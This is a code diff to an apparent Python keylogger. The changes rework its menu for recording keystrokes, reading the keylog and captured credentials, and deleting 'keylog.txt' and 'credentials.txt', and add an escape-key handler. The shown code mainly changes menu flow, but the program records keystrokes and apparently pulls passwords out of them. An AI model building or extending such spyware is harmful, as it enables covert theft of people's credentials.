@@ -34,18 +34,28 @@ def menu():
                 listener.join()
         elif option == 2:
             readLogs()
+            with Listener(on_press=escapeKey) as listener:
+                listener.join()
         elif option == 3:
             readCredentials()
+            readLogs()
+            with Listener(on_press=escapeKey) as listener:
+                listener.join()
         elif option == 4:
             deleteFile('credentials.txt')
+            readLogs()
+            with Listener(on_press=escapeKey) as listener:
+                listener.join()
         elif option == 5:
             deleteFile('keylog.txt')
+            readLogs()
+            with Listener(on_press=escapeKey) as listener:
+                listener.join()
         elif option == 6:
             print("Exit. Thanks for use this program")
-            exit()
     else:
-        print("\nError, enter a number between 1 - 4\n")
-
+        print("\nError, enter a number between 1 - 5\n")
+        menu()
 
 '''
 Function to capture keyboard events
@@ -57,8 +67,20 @@ def recordKey(key):
     if key == 'Key.esc':
         detectEIPassword()
         sys.stdout.flush()
+        menu()
         return False
     saveInFile(key)
+
+'''
+Function to capture escape events
+'''
+
+def escapeKey(key):
+    key=str(key)
+    if key == 'Key.esc':
+        sys.stdout.flush()
+        menu()
+        return False
 
 
 '''
